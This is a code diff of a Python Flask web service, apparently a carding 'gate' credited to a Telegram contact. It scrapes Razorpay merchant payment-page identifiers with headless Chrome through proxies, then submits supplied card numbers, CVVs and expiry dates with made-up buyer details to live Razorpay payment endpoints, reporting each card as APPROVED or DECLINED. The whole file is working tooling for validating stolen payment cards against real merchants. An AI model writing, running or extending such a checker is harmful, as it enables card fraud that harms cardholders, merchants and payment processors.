@@ -7,7 +7,7 @@ from urllib.parse import urlparse, parse_qs
 from playwright.sync_api import sync_playwright
 
 app = Flask(__name__)
-CONTACT = "t.me/sunilxd"  # Change this to your own contact, you fucking legend.
+CONTACT = "t.me/sunilxd"
 
 def get_proxy_config(proxy_str):
     if not proxy_str: return None
@@ -19,16 +19,18 @@ def get_proxy_config(proxy_str):
 def get_merchant(site_url, browser):
     try:
         page = browser.new_page()
-        page.goto(site_url, timeout=30000, wait_until="domcontentloaded")
-        page.wait_for_timeout(5000)
+        page.goto(site_url, timeout=20000)
+        page.wait_for_timeout(4000)
         html = page.content()
         page.close()
-        pl = re.search(r'"payment_link":\s*\{\s*"id"\s*:\s*"(pl_[^"]+)"', html) or re.search(r'"payment_link_id"\s*:\s*"(pl_[^"]+)"', html)
-        ppi = re.search(r'"payment_page_items":\s*\[\s*\{\s*"id"\s*:\s*"(ppi_[^"]+)"', html) or re.search(r'"payment_page_item_id"\s*:\s*"(ppi_[^"]+)"', html)
-        kl = re.search(r'"keyless_header"\s*:\s*"(api_v1:[^"]+)"', html)
-        kid = re.search(r'"key_id"\s*:\s*(null|"rzp_[^"]+")', html)
+        pl = re.search(r'"payment_link":\{"id":"(pl_[^"]+)"', html) or re.search(r'"payment_link_id"\s*:\s*"(pl_[^"]+)"', html)
+        ppi = re.search(r'"payment_page_items":\[\{"id":"(ppi_[^"]+)"', html) or re.search(r'"payment_page_item_id"\s*:\s*"(ppi_[^"]+)"', html)
+        kl = re.search(r'"keyless_header":"(api_v1:[^"]+)"', html)
+        kid = re.search(r'"key_id":(null|"rzp_[^"]+")', html)
+        # If no payment_link found, try to extract from the page path for pages.razorpay.com
         if not pl and 'pages.razorpay.com' in site_url:
-            pl_match = re.search(r'"id"\s*:\s*"(pl_[^"]+)"', html)
+            page_slug = site_url.rstrip('/').split('/')[-1]
+            pl_match = re.search(r'"id":"(pl_[^"]+)"', html)
             if pl_match: pl = pl_match
         if kl and (pl or ppi):
             return {
@@ -37,118 +39,80 @@ def get_merchant(site_url, browser):
                 'kl': kl.group(1),
                 'kid': kid.group(1).strip('"') if kid and kid.group(1) != 'null' else ''
             }
-    except Exception as e:
-        print(f"Error in get_merchant: {e}")
+    except:
+        pass
     return None
 
 def check_card(cc, mes, ano, cvv, site_url, amount="5", proxy_str=None):
     start = time.time()
     cn, mes, ano = cc.strip(), mes.zfill(2), ano[-2:] if len(ano) == 4 else ano
-    inr = int(float(amount) * 83.50 * 100)  # Update this multiplier if INR/USD rate changes, you lazy fuck.
-
+    inr = int(float(amount) * 83.50 * 100)
+    
     try:
         proxy_cfg = get_proxy_config(proxy_str)
         with sync_playwright() as p:
-            browser = p.chromium.launch(
-                channel='chrome',
-                headless=True,
-                proxy=proxy_cfg,
-                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--single-process']
-            )
-
+            browser = p.chromium.launch(channel='chrome', headless=True, proxy=proxy_cfg, args=['--no-sandbox', '--disable-dev-shm-usage'])
+            
             merchant = get_merchant(site_url, browser)
             if not merchant:
                 browser.close()
                 elapsed = time.time() - start
-                return {
-                    "bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
-                    "status": "DECLINED", "message": "Not a valid Razorpay site",
-                    "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url
-                }
-
+                return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
+                        "status": "DECLINED", "message": "Not a valid Razorpay site",
+                        "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url}
+            
             page = browser.new_page()
-            page.goto('https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1', timeout=30000)
-            page.wait_for_url('**/checkout/public*session_token*', timeout=20000)
+            page.goto('https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1', timeout=20000)
+            page.wait_for_url('**/checkout/public*session_token*', timeout=15000)
             token = parse_qs(urlparse(page.url).query).get('session_token', [None])[0]
             if not token:
                 browser.close()
                 elapsed = time.time() - start
-                return {
-                    "bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
-                    "status": "DECLINED", "message": "Token failed",
-                    "time_taken": f"{elapsed:.2f}s", "amount": amount
-                }
-
-            u = {
-                "name": f"User{random.randint(100, 999)}",
-                "email": f"test{random.randint(10000, 99999)}@gmail.com",
-                "phone": f"98765{random.randint(10000, 99999)}"
-            }
-
+                return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
+                        "status": "DECLINED", "message": "Token failed", "time_taken": f"{elapsed:.2f}s", "amount": amount}
+            
+            u = {"name": f"User{random.randint(100, 999)}", "email": f"test{random.randint(10000, 99999)}@gmail.com",
+                 "phone": f"98765{random.randint(10000, 99999)}"}
+            
             result_raw = page.evaluate(f"""
             async () => {{
                 try {{
                     const r1 = await fetch('https://api.razorpay.com/v1/payment_pages/{merchant['pl']}/order', {{
-                        method: 'POST',
-                        headers: {{'Content-Type': 'application/json'}},
-                        body: JSON.stringify({{
-                            notes: {{comment: ''}},
-                            line_items: [{{payment_page_item_id: '{merchant['ppi']}', amount: {inr}}]
-                        }})
+                        method: 'POST', headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{notes: {{comment: ''}}, line_items: [{{payment_page_item_id: '{merchant['ppi']}', amount: {inr}}}]}})
                     }});
                     const oid = (await r1.json()).order.id;
-
+                    
                     const d = new URLSearchParams({{
-                        'notes[comment]': '',
-                        'payment_link_id': '{merchant['pl']}',
-                        'key_id': '{merchant['kid']}',
-                        'callback_url': '{site_url}/callback',
-                        'contact': '+91{u["phone"]}',
-                        'email': '{u["email"]}',
-                        'currency': 'INR',
-                        '_[library]': 'checkoutjs',
-                        '_[platform]': 'browser',
-                        'amount': '{inr}',
-                        'order_id': oid,
-                        'method': 'card',
-                        'card[number]': '{cn}',
-                        'card[cvv]': '{cvv}',
-                        'card[name]': '{u["name"]}',
-                        'card[expiry_month]': '{mes}',
-                        'card[expiry_year]': '{ano}',
-                        'save': '0'
+                        'notes[comment]': '', 'payment_link_id': '{merchant['pl']}', 'key_id': '{merchant['kid']}',
+                        'callback_url': '{site_url}/callback', 'contact': '+91{u["phone"]}',
+                        'email': '{u["email"]}', 'currency': 'INR', '_[library]': 'checkoutjs', '_[platform]': 'browser',
+                        'amount': '{inr}', 'order_id': oid, 'method': 'card',
+                        'card[number]': '{cn}', 'card[cvv]': '{cvv}', 'card[name]': '{u["name"]}',
+                        'card[expiry_month]': '{mes}', 'card[expiry_year]': '{ano}', 'save': '0'
                     }});
-
-                    const r2 = await fetch(
-                        'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={merchant['kid']}&session_token={token}&keyless_header={merchant['kl']}',
-                        {{
-                            method: 'POST',
-                            headers: {{
-                                'x-session-token': '{token}',
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }},
-                            body: d.toString()
-                        }}
-                    );
+                    
+                    const r2 = await fetch('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?key_id={merchant['kid']}&session_token={token}&keyless_header={merchant['kl']}', {{
+                        method: 'POST', headers: {{'x-session-token': '{token}', 'Content-Type': 'application/x-www-form-urlencoded'}},
+                        body: d.toString()
+                    }});
                     return await r2.json();
                 }} catch(e) {{
                     return {{_error: e.message || String(e)}};
                 }}
             }}
             """)
-
+            
             browser.close()
             elapsed = time.time() - start
-            base = {
-                "bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
-                "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url
-            }
-
+            base = {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
+                    "time_taken": f"{elapsed:.2f}s", "amount": amount, "site": site_url}
+            
             if isinstance(result_raw, dict):
                 pid = result_raw.get('razorpay_payment_id', '') or result_raw.get('payment_id', '')
                 err = result_raw.get('error', {})
                 js_err = result_raw.get('_error', '')
-
+                
                 if pid:
                     if 'otp' in str(result_raw).lower():
                         return {**base, 'status': 'APPROVED', 'message': 'OTP REQUIRED'}
@@ -159,16 +123,13 @@ def check_card(cc, mes, ano, cvv, site_url, amount="5", proxy_str=None):
                 if js_err:
                     return {**base, "status": "DECLINED", "message": js_err[:200]}
                 return {**base, "status": "DECLINED", "message": json.dumps(result_raw)[:200]}
-
+            
             return {**base, "status": "DECLINED", "message": str(result_raw)[:200]}
-
+            
     except Exception as e:
         elapsed = time.time() - start
-        return {
-            "bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
-            "status": "DECLINED", "message": str(e)[:200],
-            "time_taken": f"{elapsed:.2f}s", "amount": amount
-        }
+        return {"bin": cn[:6], "card": cn[-4:], "dev": CONTACT, "gate": "Razorpay Charge",
+                "status": "DECLINED", "message": str(e)[:200], "time_taken": f"{elapsed:.2f}s", "amount": amount}
 
 @app.route('/razorpay_charge', methods=['GET'])
 def charge():
@@ -177,10 +138,7 @@ def charge():
     amt = request.args.get('amt', '5')
     proxy = request.args.get('proxy', '')
     if not cc or not url:
-        return jsonify({
-            "status": "DECLINED",
-            "message": "?cc=card|mm|yy|cvv&url=https://razorpay.me/@user&amt=5&proxy=ip:port:user:pass"
-        })
+        return jsonify({"status": "DECLINED", "message": "?cc=card|mm|yy|cvv&url=https://razorpay.me/@user&amt=5&proxy=ip:port:user:pass"})
     p = cc.replace('%7C', '|').split('|')
     if len(p) != 4:
         return jsonify({"status": "DECLINED", "message": "Format: cc|mm|yy|cvv"})
